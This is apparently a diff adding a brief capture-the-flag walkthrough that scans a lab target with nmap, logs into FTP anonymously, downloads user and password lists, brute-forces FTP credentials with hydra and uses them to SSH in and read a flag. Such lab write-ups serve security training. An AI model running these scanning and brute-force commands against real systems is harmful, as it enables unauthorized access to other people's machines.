@@ -1,0 +1,24 @@
+Enumerate the target
+sudo nmap -sC -sV <Target IP>
+FTP open on port 2***
+//comment: Apparently sometimes the port 2*** doesn't show up during the scan, if that happens, restart the Target VM
+
+Anonymously log into the target via ftp
+ftp anonymous@<Target IP> -p 2***
+
+Check for files with ls
+
+Download the users.list and passwords.list
+get users.list
+get passwords.list
+
+Use hidra to brute force the username and password, this will take a few minutes
+hydra -L users.list -P passwords.list ftp://<Target IP>:2***
+
+Found username and password
+
+use the new username and password to ssh into the Target
+ssh r****@<Target Ip>
+
+Find the flag on the machine using ls
+cat flag.txt
